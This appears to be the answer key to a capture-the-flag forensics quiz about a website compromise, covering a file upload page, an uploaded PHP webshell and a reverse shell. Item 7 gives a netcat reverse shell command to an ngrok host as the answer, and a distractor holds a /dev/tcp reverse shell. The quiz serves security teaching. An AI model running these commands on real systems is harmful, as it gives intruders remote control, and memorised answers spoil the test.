1. What is the IP address for the vulnerable website?
```
10.0.2.15	
127.0.0.1	
[206.89.59.199]
172.217.17.142	
```

2. What is the name of the file with file upload functionality? (just the name, no relative location)
```
fileupload1.php
```

3. . What is the name of the first file uploaded?
```
file	
[linux-sandwich-cracker-box.JPG]	
shell	
shell.php	
```

4. Looking at the webshell uploaded, what was the usage example name?
```
[another_obfuscated_phpshell.php]	
shell.php	
revshell.php	
GET	
```

5. What is the relative location of the uploaded webshell?
```
[/uploads/shell.php]	
/tmp/shell.php	
/usr/share/webshells/php/shell.php	
c:/user/shell/shell.php	
```

6. What was the first command executed using the webshell?
```
ls	
ls -lsa	
[whoami]	
who	
```

7. What is the reverse shell command executed through the webshell? (before encoding)
```
[nc 0.tcp.eu.ngrok.io 17344 -e /bin/bash]	
nc%200.tcp.eu.ngrok.io%2017344%20-e%20/bin/bash	
ls%20-lsa	
/bin/bash -c 'bash -c >& /dev/tcp/10.10.10.10/4444 0>&1'	
```

8. What is the correct order?
```
[protocol]://[path]:[port]/[host]?[fragment]#[query]	
**[protocol]://[host]:[port]/[path]?[query]#[fragment]**
[protocol]://[host]/[port]/[path]?[query]:[fragment]	
[protocol]://[host]@[path]:[port]?[query]#[fragmnet]	
```

9. What type of web server was used?
```
[Apache/2.4.38]
Mozilla/5.0	
Firefox/102.0	
Gecko/20100101	
```

10. What's your name? (For the leaderboard)
```

```
